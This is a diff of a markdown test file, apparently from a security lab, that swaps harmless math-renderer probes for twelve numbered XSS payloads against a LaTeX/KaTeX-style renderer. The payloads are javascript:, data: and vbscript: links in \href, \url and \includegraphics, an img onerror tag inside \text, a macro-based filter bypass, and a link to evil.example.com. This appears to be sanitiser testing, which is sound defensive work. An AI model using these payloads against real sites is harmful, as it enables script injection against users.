@@ -1,39 +1,37 @@
-# gh-authz-lab
+# HBV4 math lane
 
-math lane renderer identification battery
+1 href-js
+$$\href{javascript:alert(1)}{CLICK1}$$
 
-A1 href: $$\href{https://example.com/HBV4A}{AAA}$$
+2 href-data
+$$\href{data:text/html,<script>alert(2)</script>}{CLICK2}$$
 
-A2 url: $$\url{https://example.com/HBV4B}$$
+3 url
+$$\url{javascript:alert(3)}$$
 
-A3 htmlClass: $$\htmlClass{hbv4cls}{BBB}$$
+4 includegraphics
+$$\includegraphics{javascript:alert(4)}$$
 
-A4 htmlId: $$\htmlId{hbv4id}{CCC}$$
+5 htmlData
+$$\htmlData{foo=bar}{CLICK5}$$
 
-A5 htmlStyle: $$\htmlStyle{color:red}{DDD}$$
+6 htmlClass htmlId htmlStyle
+$$\htmlClass{c6}{\htmlId{i6}{\htmlStyle{color:red}{CLICK6}}}$$
 
-A6 htmlData: $$\htmlData{foo=bar}{EEE}$$
+7 text with markup
+$$\text{<img src=x onerror=alert(7)>}$$
 
-A7 includegraphics: $$\includegraphics[width=1em]{https://example.com/x.png}$$
+8 macro def then href
+$$\def\p{javascript:alert(8)}\href{\p}{CLICK8}$$
 
-A8 text: $$\text{PLAINTEXTOK}$$
+9 href relative-scheme
+$$\href{//evil.example.com}{CLICK9}$$
 
-A9 def: $$\def\hbvx{ZZZ}\hbvx$$
+10 href vbscript
+$$\href{vbscript:alert(10)}{CLICK10}$$
 
-A10 newcommand: $$\newcommand{\hbvy}{YYY}\hbvy$$
+11 inline math
+$`\href{javascript:alert(11)}{CLICK11}`$
 
-A11 csname: $$\csname hbvx\endcsname$$
-
-A12 unknown command: $$\thisisnotarealcommandhbv4$$
-
-A13 raisebox: $$\raisebox{1em}{RRR}$$
-
-A14 mathjax require: $$\require{action}$$
-
-A15 inline: $x^2+HBV4INL$
-
-A16 fence:
-
-```math
-\href{https://example.com/HBV4F}{FENCED}
-```
+12 benign control
+$$E = mc^2$$
